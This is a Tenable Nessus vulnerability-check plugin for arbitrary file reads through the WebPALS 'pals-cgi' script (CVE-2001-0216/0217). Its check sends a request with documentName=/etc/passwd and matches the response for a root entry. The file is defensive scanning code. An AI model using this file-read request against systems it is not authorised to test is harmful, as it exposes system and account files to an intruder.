#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10611);
 script_version ("$Revision: 1.26 $");
 script_cve_id("CVE-2001-0216", "CVE-2001-0217");
 script_bugtraq_id(2372);
 script_osvdb_id(507, 15394);
 
 script_name(english:"PALS Library System WebPALS pals-cgi Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files from the remote 
system." );
 script_set_attribute(attribute:"description", value:
"The 'pals-cgi' CGI is installed. This CGI has a well known
security flaw that lets an attacker read arbitrary files
with the privileges of the http daemon (usually root or 
nobody)." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/02/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/02/02");
 script_cvs_date("$Date: 2016/12/28 15:10:48 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for the presence of /cgi-bin/pals-cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

foreach dir (cgi_dirs())
{
  u = dir + "/pals-cgi?palsAction=restart&documentName=/etc/passwd";
  r = http_send_recv3(port:port, method:"GET", item: u, exit_on_fail: 1);
  if (egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
  {
    if (report_verbosity < 1)
      security_hole(port);
    else
    {
      txt = strcat('\nThe following URL exhibits the flaw :\n' , build_url(port: port, qs: u), '\n');
      security_hole(port:port, extra: txt);
    }
  }
}
